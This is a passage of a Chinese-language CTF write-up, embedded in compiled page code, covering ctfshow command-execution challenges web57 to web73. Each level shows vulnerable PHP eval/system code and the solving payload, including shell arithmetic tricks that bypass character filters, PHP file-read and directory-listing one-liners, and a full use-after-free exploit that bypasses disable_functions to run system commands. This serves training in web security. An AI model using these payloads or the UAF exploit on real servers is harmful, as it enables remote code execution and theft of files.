if(!preg_match("/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\\'|\\"|\\`|\\%|\\x09|\\x26|\\x0a|\\>|\\<|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i", $c)){\r\n        system("cat ".$c.".php");\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n} \n'})}),"\n",(0,l.jsx)(n.p,{children:"\u53ef\u4ee5\u770b\u7684\u51fa\u6765\u9898\u76ee\u8981\u6c42\u662f\u8ba9\u6211\u4eec\u6784\u9020\u51fac = 36\uff0c\u4f46\u662f\u8fd9\u91cc\u6570\u5b57\u5b57\u6bcd\u90fd\u8fc7\u6ee4\u4e86\uff0c\u4e5f\u53ea\u80fd\u7528\u7279\u6b8a\u7b26\u53f7\u6765\u64cd\u4f5c\u4e86"}),"\n",(0,l.jsx)(n.p,{children:"\u770b\u4e86\u5357\u795e\ud83d\udc74\ud83d\udc74\u7684\u535a\u5ba2\uff0c\u8bf4\u53ef\u4ee5\u7528$\u548c()\u6765\u6784\u9020\u6570\u5b57\uff0c\u6765\u5c1d\u8bd5\u4e00\u4e0b"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20211115092727997",src:r(7574).A+"",width:"725",height:"361"})}),"\n",(0,l.jsx)(n.p,{children:"\u53ef\u4ee5\u770b\u5230"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-shell",children:"echo $(()) = 0\r\n\u5bf9\u5176\u53d6\u53cd\r\necho $((~$(()))) = -1\r\n\u53d6\u53cd\u52a0\u8d77\u6765\r\necho $(($((~$(())))$((~$(()))))) = -2\r\n\u5bf9\u4e0a\u9762\u7684\u53d6\u53cd\r\necho $((~$(($((~$(())))$((~$(()))))))) = 1\r\n\r\n\u767e\u5ea6\u4e4b\u540e\uff0c\u53d1\u73b0$(())\u662f\u7528\u6765\u4f5c\u6574\u6570\u8fd0\u7b97\r\n\u5982a=5 b=7 c=2\r\necho $((a+b*c)) = 19\r\n$(())\u80fd\u8fdb\u884c\u7684\u8fd0\u7b97\u6709\r\n+ - * / \u52a0\u3001\u51cf\u3001\u4e58\u3001\u9664\r\n\r\n% \u4f59\u6570\u8fd0\u7b97\r\n\r\n& | ^ ! AND\u3001OR\u3001XOR\u3001NOT\u8fd0\u7b97\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u597d\uff0c\u5982\u679c\u8981\u6784\u902036\uff0c\u53ea\u9700\u8981\u6784\u9020\u51fa-37\u7136\u540e\u5bf9\u5176\u8fdb\u884c\u53d6\u53cd\u5373\u53ef\uff0c\u4e2d\u95f4\u5c31\u662f\u5957\u5a03-1\u8fc7\u7a0b\uff0c\u6700\u540e\u518d\u53d6\u53cd\u5373\u53ef\uff0c\u975e\u5e38\u597d\u505a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-python",children:'print("$((~$(("+"$((~$(())))"*37+"))))")\n'})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u540e\u67e5\u770b\u6e90\u4ee3\u7801\u5373\u53ef"}),"\n",(0,l.jsx)(n.h3,{id:"web58",children:"web58"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_POST['c'])){\r\n        $c= $_POST['c'];\r\n        eval($c);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u91cc\u5f00\u59cb\u5c31\u662fpost\u4e86\uff0c\u540e\u9762\u7684\u6240\u6709\u9898\u57fa\u672c\u90fd\u80fd\u7528\u8681\u5251\u76f4\u63a5\u8fde\u63a5\uff0c\u4f46\u662f\u8fd9\u91cc\u4e0d\u662f\u60f3\u8fd9\u6837\u8003\u5c31\u4e0d\u8fd9\u6837\u4e86"}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u9898\u7ed9\u7684\u662feval\uff0c\u4e4b\u524d\u662fsystem\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\uff0c\u800ceval\u662f\u6587\u672c\u8f6cphp\u4ee3\u7801"}),"\n",(0,l.jsx)(n.p,{children:"eval\u548csystem\u5bf9\u5e94\u7684\u5e94\u8be5\u662f \u4ee3\u7801\u6267\u884c\u548c\u547d\u4ee4\u6267\u884c\uff0c\u4e0d\u80fd\u641e\u6df7\u4e86"}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u91cc\u76f4\u63a5copy\u4e00\u4e0b\u5357\u795e\u79ef\u7d2f\u7684\u8bfb\u53d6\u6587\u4ef6\u7684\u51fd\u6570"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:'highlight_file($filename);\r\nshow_source($filename);\r\nprint_r(php_strip_whitespace($filename));\r\nprint_r(file_get_contents($filename));\r\nreadfile($filename);\r\nprint_r(file($filename)); // var_dump\r\nfread(fopen($filename,"r"), $size);\r\ninclude($filename); // \u975ephp\u4ee3\u7801\r\ninclude_once($filename); // \u975ephp\u4ee3\u7801\r\nrequire($filename); // \u975ephp\u4ee3\u7801\r\nrequire_once($filename); // \u975ephp\u4ee3\u7801\r\nprint_r(fread(popen("cat flag", "r"), $size));\r\nprint_r(fgets(fopen($filename, "r"))); // \u8bfb\u53d6\u4e00\u884c\r\nfpassthru(fopen($filename, "r")); // \u4ece\u5f53\u524d\u4f4d\u7f6e\u4e00\u76f4\u8bfb\u53d6\u5230 EOF\r\nprint_r(fgetcsv(fopen($filename,"r"), $size));\r\nprint_r(fgetss(fopen($filename, "r"))); // \u4ece\u6587\u4ef6\u6307\u9488\u4e2d\u8bfb\u53d6\u4e00\u884c\u5e76\u8fc7\u6ee4\u6389 HTML \u6807\u8bb0\r\nprint_r(fscanf(fopen("flag", "r"),"%s"));\r\nprint_r(parse_ini_file($filename)); // \u5931\u8d25\u65f6\u8fd4\u56de false , \u6210\u529f\u8fd4\u56de\u914d\u7f6e\u6570\u7ec4\n'})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u91cc\u76f4\u63a5show_source\u5373\u53ef"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'POST: c=show_source("flag.php");\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web59",children:"web59"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_POST['c'])){\r\n        $c= $_POST['c'];\r\n        eval($c);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u91cc\u662f\u540e\u53f0\u52a0\u4e86\u9ed1\u540d\u5355\uff0c\u54b1\u4eec\u4e0d\u7528\u4e0a\u9762\u7684\u4e86\uff0c\u6362\u70b9\u5176\u4ed6\u7684"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'POST: c=print_r(file("flag.php"));\n'})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20211115100905750",src:r(6513).A+"",width:"1891",height:"119"})}),"\n",(0,l.jsx)(n.h3,{id:"web60",children:"web60"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_POST['c'])){\r\n        $c= $_POST['c'];\r\n        eval($c);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u518d\u6362\u4e00\u4e2a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'POST: c=highlight_file("flag.php");\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web61",children:"web61"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_POST['c'])){\r\n        $c= $_POST['c'];\r\n        eval($c);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u518d\u6362\u4e00\u4e2a ",(0,l.jsx)(n.del,{children:"\u8fd9\u6ce2\u600e\u4e48\u6211\u6362\u4e00\u4e2a\u88ab\u7981\u4e00\u4e2a"})]}),"\n",(0,l.jsxs)(n.p,{children:["\u4e0d\u6362\u4e86",(0,l.jsx)(n.del,{children:"\u5988\u7684"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'POST: c=highlight_file("flag.php");\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web62",children:"web62"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_POST['c'])){\r\n        $c= $_POST['c'];\r\n        eval($c);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'c=highlight_file("flag.php");\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web63",children:"web63"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_POST['c'])){\r\n        $c= $_POST['c'];\r\n        eval($c);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.del,{children:"\u739b\u5fb7\u7ee7\u7eed\u7528\u8fd9\u4e2apayload"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'c=highlight_file("flag.php");\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web64",children:"web64"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_POST['c'])){\r\n        $c= $_POST['c'];\r\n        eval($c);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.del,{children:"\u5c45\u7136\u8fd8\u80fd\u7528"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'c=highlight_file("flag.php");\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web65",children:"web65"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_POST['c'])){\r\n        $c= $_POST['c'];\r\n        eval($c);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.del,{children:"\u4e3a\u4ec0\u4e48\u8fd8\u80fd\u7528\u554a\u8349"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'c=highlight_file("flag.php");\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web66",children:"web66"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_POST['c'])){\r\n        $c= $_POST['c'];\r\n        eval($c);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:'\u6211\u8fd8\u662fc=highlight_file("flag.php");'}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u540e\u8bf4 \u79c0\u79c0\u5f97\u4e86\uff0c\u8fd9\u6b21\u4e0d\u5728\u8fd9\u91cc\uff0c\u4e8e\u662f\u7528print_r(scandir\u67e5\u770b\u4e00\u4e0b\u5728\u54ea)"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'c=print_r(scandir("./"));\r\n#flag.php   index.php\r\nflag.php\u5c31\u521a\u521a\u5047\u7684 \u4e8e\u662f\u53bb\u770b\u6839\u76ee\u5f55\r\nc=print_r(scandir("/"));\r\n# \u2026\u2026\u2026\u2026\u2026\u2026 flag.txt \u2026\u2026\u2026\u2026\u2026\u2026\n'})}),"\n",(0,l.jsx)(n.p,{children:"payload"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"c=highlight_file('/flag.txt');\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web67",children:"web67"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_POST['c'])){\r\n        $c= $_POST['c'];\r\n        eval($c);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"c=highlight_file('/flag.txt');\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web68",children:"web68"}),"\n",(0,l.jsx)(n.p,{children:"\u6253\u5f00\u5c31\u76f4\u63a5\u8bf4"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 19\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u9ebb\u9ebb\u7684\uff0c\u4f46\u4e0d\u96be\u731c\u51fa"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"if(isset($_POST['c'])){\r\n        $c= $_POST['c'];\r\n        eval($c);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u540e\u8fd9\u91cc\u8fd8\u628aprint_r\u7ed9\u7981\u4e86\uff0c\u7528var_dump()\u5427"}),"\n",(0,l.jsx)(n.p,{children:'c=var_dump(scandir("/"));'}),"\n",(0,l.jsx)(n.p,{children:"\u8fd8\u662f\u5728\u8ddf\u76ee\u5f55 flag.txt"}),"\n",(0,l.jsx)(n.p,{children:"\u65e2\u7136highlight\u4e0d\u8ba9\u7528\uff0c\u90a3\u5c31\u6362\u522b\u7684"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'c=require("/flag.txt");\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web69",children:"web69"}),"\n",(0,l.jsx)(n.p,{children:"highlight_file()\u8fd8\u662f\u6ca1\u4e86var_dump\u5c45\u7136\u4e5f\u6ca1\u4e86"}),"\n",(0,l.jsx)(n.p,{children:"\u867d\u7136payload\u8fd8\u662f"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'c=require("/flag.txt");\n'})}),"\n",(0,l.jsx)(n.p,{children:"\u4e8e\u662f\u53bb\u627e\u4e00\u4e0b\u53ef\u4ee5\u8bfb\u53d6\u76ee\u5f55\u7684\u65b9\u5f0f,\u6211\u767e\u5ea6\u4e86114514/19198\u79d2\uff0c\u6ca1\u627e\u5230\uff0c\u4e8e\u662f\u5c31cv\u5357\u795e\u7684\u4e86"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:'print_r(glob("*")); // \u5217\u5f53\u524d\u76ee\u5f55\r\nprint_r(glob("/*")); // \u5217\u6839\u76ee\u5f55\r\nprint_r(scandir("."));\r\nprint_r(scandir("/"));\r\n$d=opendir(".");while(false!==($f=readdir($d))){echo"$f\\n";}\r\n$d=dir(".");while(false!==($f=$d->read())){echo$f."\\n";}\r\n$a=glob("/*");foreach($a as $value){echo $value."   ";}\r\n$a=new DirectoryIterator(\'glob:///*\');foreach($a as $f){echo($f->__toString()." ");}\n'})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u91cc\u662f\u8fc7\u6ee4\u4e86print_r\u6240\u4ee5\u7528\u540e\u9762\u7684"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'c=$d=opendir("/");while(false!==($f=readdir($d))){echo"$f\\n";}\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web70",children:"web70"}),"\n",(0,l.jsx)(n.p,{children:"\u6253\u5f00\u4e4b\u540e"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14\r\n\r\nWarning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15\r\n\r\nWarning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 21\r\n\u4f60\u8981\u4e0a\u5929\u5417\uff1f\n"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:'c=$d=opendir("/");while(false!==($f=readdir($d))){echo"$f\\n";}\r\n\r\nc=require("/flag.txt");\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web71",children:"web71"}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u6b21\u9898\u76ee\u7ed9\u4e86index.php"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"error_reporting(0);\r\nini_set('display_errors', 0);\r\n// \u4f60\u4eec\u5728\u70ab\u6280\u5417\uff1f\r\nif(isset($_POST['c'])){\r\n        $c= $_POST['c'];\r\n        eval($c);\r\n        $s = ob_get_contents();\r\n        ob_end_clean();\r\n        echo preg_replace(\"/[0-9]|[a-z]/i\",\"?\",$s);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\r\n\r\n?>\r\n\r\n\u4f60\u8981\u4e0a\u5929\u5417\uff1f\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u53bb\u641c\u4e86\u4e00\u4e0bob_get_contents()\u548c ob_end_clean()\uff0c\u524d\u8005\u662f\u83b7\u5f97\u7f13\u51b2\u533a\u7684\u5185\u5bb9\uff0c\u540e\u8005\u662f\u6e05\u9664\u7f13\u51b2\u533a\u7684\u5185\u5bb9\uff0c\u5e76\u5c06\u7f13\u51b2\u533a\u5173\u95ed\uff0c\u4f46\u4e0d\u4f1a\u8f93\u51fa\u5185\u5bb9\u3002\u5982\u6b64\u987a\u5e8f\u7ec4\u5408\u5c31\u5b8c\u6210\u4e86\u8f93\u51fa$c\u6267\u884c\u7684\u547d\u4ee4\u7ed3\u679c\u5230s\u91cc\u5e76\u4e14\u6e05\u9664\u8fd9\u4e2a\u539f\u6765\u7684\u6267\u884c\u7ed3\u679c"}),"\n",(0,l.jsx)(n.p,{children:"\u7528\u4e0a\u4e00\u9053\u7684payload\u6253\u4e00\u4e0b\u8bd5\u8bd5"}),"\n",(0,l.jsx)(n.p,{children:"\u8f93\u51fa\u7684\u662f"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-output",children:"???????: ?????_?????????() ??? ???? ???????? ??? ???????? ??????? ?? /???/???/????/?????.??? ?? ???? ?? ???????: ???_???() ??? ???? ???????? ??? ???????? ??????? ?? /???/???/????/?????.??? ?? ???? ?? ???????{????????-????-????-????-????????????} \u4f60\u8981\u4e0a\u5929\u5417\uff1f\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u4e5f\u5c31\u662f[a-zA-Z0-9]\u90e8\u5206 \u88ab\u5b8c\u5168\u8f93\u51fa\u6210\u95ee\u53f7\u4e86"}),"\n",(0,l.jsx)(n.p,{children:"\u770b\u4e86\u773c\u5357\u795e\u7684\uff0c\u53ef\u4ee5\u5728\u540e\u9762\u52a0\u4e00\u4e2aexit();\u9000\u51fa\uff0c\u8fd9\u6837\u5c31\u6267\u884c\u4e0d\u5230\u540e\u9762\u7684\u547d\u4ee4\u4e86"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'c=require("/flag.txt");exit();\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web72",children:"***web72"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"error_reporting(0);\r\nini_set('display_errors', 0);\r\n// \u4f60\u4eec\u5728\u70ab\u6280\u5417\uff1f\r\nif(isset($_POST['c'])){\r\n        $c= $_POST['c'];\r\n        eval($c);\r\n        $s = ob_get_contents();\r\n        ob_end_clean();\r\n        echo preg_replace(\"/[0-9]|[a-z]/i\",\"?\",$s);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\r\n\r\n?>\r\n\r\n\u4f60\u8981\u4e0a\u5929\u5417\uff1f\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u6ca1\u5565\u533a\u522b\u554a\u548c\u4e0a\u4e00\u9053"}),"\n",(0,l.jsx)(n.p,{children:"\u6211\u76f4\u63a5\u6267\u884c\uff0c\u5f88\u5feb\u554a"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20211115192002121",src:r(90984).A+"",width:"1476",height:"213"})}),"\n",(0,l.jsx)(n.p,{children:"\u8bf6\uff0c\u6839\u672c\u6ca1\u6709\uff0c\u4e8e\u662f\u7528\u4e4b\u524d\u7684payload\u770b\u4e00\u770b\u6839\u76ee\u5f55\u4e0b\uff0c\u7136\u540e\u540e\u9762\u52a0\u4e00\u4e2aexit()\u5c31\u884c"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString().\" \");}exit();\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8bd5\u8fc7\u4e86 \u5176\u4ed67\u79cd\u90fd\u4e0d\u884c \u5c31\u8fd9\u4e2a\u624d\u53ef\u4ee5\uff0c\u8349"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20211115192321642",src:r(70840).A+"",width:"1046",height:"145"})}),"\n",(0,l.jsx)(n.p,{children:'\u6211\u60f3c=require("/flag0.txt");exit();\uff0c\u4f46\u662f\u76f4\u63a5\u62a5\u9519\u4e86\u3002'}),"\n",(0,l.jsx)(n.p,{children:"\u5509\u770b\u770b\u5357\u795e\u535a\u5ba2\u5427"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20211115192547525",src:r(48932).A+"",width:"1119",height:"327"})}),"\n",(0,l.jsx)(n.p,{children:"\u53c8\u4e0d\u8ba9\u6253\u5f00\uff0c\u53c8\u7981\u51fd\u6570\uff0c\u722c"}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u91cc\u662f\u7528uaf\u811a\u672c\u6765\u547d\u4ee4\u6267\u884c\uff0c\u7fa4\u4e3b\u53d1\u8fc7\u3002\u9700\u8981url\u7f16\u7801"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"c=function ctfshow($cmd) {\r\n    global $abc, $helper, $backtrace;\r\n\r\n    class Vuln {\r\n        public $a;\r\n        public function __destruct() { \r\n            global $backtrace; \r\n            unset($this->a);\r\n            $backtrace = (new Exception)->getTrace();\r\n            if(!isset($backtrace[1]['args'])) {\r\n                $backtrace = debug_backtrace();\r\n            }\r\n        }\r\n    }\r\n\r\n    class Helper {\r\n        public $a, $b, $c, $d;\r\n    }\r\n\r\n    function str2ptr(&$str, $p = 0, $s = 8) {\r\n        $address = 0;\r\n        for($j = $s-1; $j >= 0; $j--) {\r\n            $address <<= 8;\r\n            $address |= ord($str[$p+$j]);\r\n        }\r\n        return $address;\r\n    }\r\n\r\n    function ptr2str($ptr, $m = 8) {\r\n        $out = \"\";\r\n        for ($i=0; $i < $m; $i++) {\r\n            $out .= sprintf(\"%c\",($ptr & 0xff));\r\n            $ptr >>= 8;\r\n        }\r\n        return $out;\r\n    }\r\n\r\n    function write(&$str, $p, $v, $n = 8) {\r\n        $i = 0;\r\n        for($i = 0; $i < $n; $i++) {\r\n            $str[$p + $i] = sprintf(\"%c\",($v & 0xff));\r\n            $v >>= 8;\r\n        }\r\n    }\r\n\r\n    function leak($addr, $p = 0, $s = 8) {\r\n        global $abc, $helper;\r\n        write($abc, 0x68, $addr + $p - 0x10);\r\n        $leak = strlen($helper->a);\r\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\r\n        return $leak;\r\n    }\r\n\r\n    function parse_elf($base) {\r\n        $e_type = leak($base, 0x10, 2);\r\n\r\n        $e_phoff = leak($base, 0x20);\r\n        $e_phentsize = leak($base, 0x36, 2);\r\n        $e_phnum = leak($base, 0x38, 2);\r\n\r\n        for($i = 0; $i < $e_phnum; $i++) {\r\n            $header = $base + $e_phoff + $i * $e_phentsize;\r\n            $p_type  = leak($header, 0, 4);\r\n            $p_flags = leak($header, 4, 4);\r\n            $p_vaddr = leak($header, 0x10);\r\n            $p_memsz = leak($header, 0x28);\r\n\r\n            if($p_type == 1 && $p_flags == 6) { \r\n\r\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\r\n                $data_size = $p_memsz;\r\n            } else if($p_type == 1 && $p_flags == 5) { \r\n                $text_size = $p_memsz;\r\n            }\r\n        }\r\n\r\n        if(!$data_addr || !$text_size || !$data_size)\r\n            return false;\r\n\r\n        return [$data_addr, $text_size, $data_size];\r\n    }\r\n\r\n    function get_basic_funcs($base, $elf) {\r\n        list($data_addr, $text_size, $data_size) = $elf;\r\n        for($i = 0; $i < $data_size / 8; $i++) {\r\n            $leak = leak($data_addr, $i * 8);\r\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\r\n                $deref = leak($leak);\r\n                \r\n                if($deref != 0x746e6174736e6f63)\r\n                    continue;\r\n            } else continue;\r\n\r\n            $leak = leak($data_addr, ($i + 4) * 8);\r\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\r\n                $deref = leak($leak);\r\n                \r\n                if($deref != 0x786568326e6962)\r\n                    continue;\r\n            } else continue;\r\n\r\n            return $data_addr + $i * 8;\r\n        }\r\n    }\r\n\r\n    function get_binary_base($binary_leak) {\r\n        $base = 0;\r\n        $start = $binary_leak & 0xfffffffffffff000;\r\n        for($i = 0; $i < 0x1000; $i++) {\r\n            $addr = $start - 0x1000 * $i;\r\n            $leak = leak($addr, 0, 7);\r\n            if($leak == 0x10102464c457f) {\r\n                return $addr;\r\n            }\r\n        }\r\n    }\r\n\r\n    function get_system($basic_funcs) {\r\n        $addr = $basic_funcs;\r\n        do {\r\n            $f_entry = leak($addr);\r\n            $f_name = leak($f_entry, 0, 6);\r\n\r\n            if($f_name == 0x6d6574737973) {\r\n                return leak($addr + 8);\r\n            }\r\n            $addr += 0x20;\r\n        } while($f_entry != 0);\r\n        return false;\r\n    }\r\n\r\n    function trigger_uaf($arg) {\r\n\r\n        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\r\n        $vuln = new Vuln();\r\n        $vuln->a = $arg;\r\n    }\r\n\r\n    if(stristr(PHP_OS, 'WIN')) {\r\n        die('This PoC is for *nix systems only.');\r\n    }\r\n\r\n    $n_alloc = 10; \r\n    $contiguous = [];\r\n    for($i = 0; $i < $n_alloc; $i++)\r\n        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\r\n\r\n    trigger_uaf('x');\r\n    $abc = $backtrace[1]['args'][0];\r\n\r\n    $helper = new Helper;\r\n    $helper->b = function ($x) { };\r\n\r\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\r\n        die(\"UAF failed\");\r\n    }\r\n\r\n    $closure_handlers = str2ptr($abc, 0);\r\n    $php_heap = str2ptr($abc, 0x58);\r\n    $abc_addr = $php_heap - 0xc8;\r\n\r\n    write($abc, 0x60, 2);\r\n    write($abc, 0x70, 6);\r\n\r\n    write($abc, 0x10, $abc_addr + 0x60);\r\n    write($abc, 0x18, 0xa);\r\n\r\n    $closure_obj = str2ptr($abc, 0x20);\r\n\r\n    $binary_leak = leak($closure_handlers, 8);\r\n    if(!($base = get_binary_base($binary_leak))) {\r\n        die(\"Couldn't determine binary base address\");\r\n    }\r\n\r\n    if(!($elf = parse_elf($base))) {\r\n        die(\"Couldn't parse ELF header\");\r\n    }\r\n\r\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\r\n        die(\"Couldn't get basic_functions address\");\r\n    }\r\n\r\n    if(!($zif_system = get_system($basic_funcs))) {\r\n        die(\"Couldn't get zif_system address\");\r\n    }\r\n\r\n\r\n    $fake_obj_offset = 0xd0;\r\n    for($i = 0; $i < 0x110; $i += 8) {\r\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\r\n    }\r\n\r\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\r\n    write($abc, 0xd0 + 0x38, 1, 4); \r\n    write($abc, 0xd0 + 0x68, $zif_system); \r\n\r\n    ($helper->b)($cmd);\r\n    exit();\r\n}\r\n\r\nctfshow(\"cat /flag0.txt\");ob_end_flush();\r\n\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web73",children:"web73"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'c=$a=new DirectoryIterator(\'glob:///*\');foreach($a as $f){echo($f->__toString()." ");}exit();\r\n\r\nbin dev etc flagc.txt home lib media mnt opt proc root run sbin srv sys tmp usr 